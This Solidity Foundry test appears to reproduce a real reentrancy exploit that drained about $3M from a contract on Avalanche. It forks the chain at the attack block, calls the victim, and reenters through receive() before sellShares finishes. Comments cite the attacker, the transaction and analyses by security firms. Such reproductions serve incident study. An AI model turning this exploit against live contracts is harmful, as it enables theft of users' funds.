// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3M$
// Attacker : https://snowtrace.io/address/0xa2ebf3fcd757e9be1e58b643b6b5077d11b4ad7a
// Attack Contract : https://snowtrace.io/address/0x7f283edc5ec7163de234e6a97fdfb16ff2d2c7ac
// Victim Contract : https://snowtrace.io/address/0xa481b139a1a654ca19d2074f174f17d7534e8cec
// Attack Tx : https://snowtrace.io/tx/0x4f37ffecdad598f53b8d5a2d9df98e3c00fbda4328585eb9947a412b5fe17ac5

// @Analysis
// https://twitter.com/BlockSecTeam/status/1710556926986342911
// https://twitter.com/Phalcon_xyz/status/1710554341466395065
// https://twitter.com/peckshield/status/1710555944269292009

contract ContractTest is Test {
    address private constant victimContract = 0xA481B139a1A654cA19d2074F174f17D7534e8CeC;
    bool private reenter = true;

    function setUp() public {
        vm.createSelectFork("Avalanche", 36_136_405);
    }

    function testExploit() public {
        deal(address(this), 1 ether);

        emit log_named_decimal_uint("Attacker AVAX balance before exploit", address(this).balance, 18);

        (bool success,) = victimContract.call{value: 1 ether}(
            abi.encodeWithSelector(bytes4(0xe9ccf3a3), address(this), true, address(this))
        );
        require(success, "Call to function with selector 0xe9ccf3a3 fail");

        (bool success2,) = victimContract.call(abi.encodeWithSignature("sellShares(address,uint256)", address(this), 1));
        require(success2, "Call to sellShares() fail");

        emit log_named_decimal_uint("Attacker AVAX balance after exploit", address(this).balance, 18);
    }

    receive() external payable {
        if (reenter == true) {
            (bool success,) = victimContract.call(abi.encodeWithSelector(bytes4(0x5632b2e4), 91e9, 91e9, 91e9, 91e9));
            require(success, "Call to function with selector 0x5632b2e4 fail");
            reenter = false;
        }
    }
}
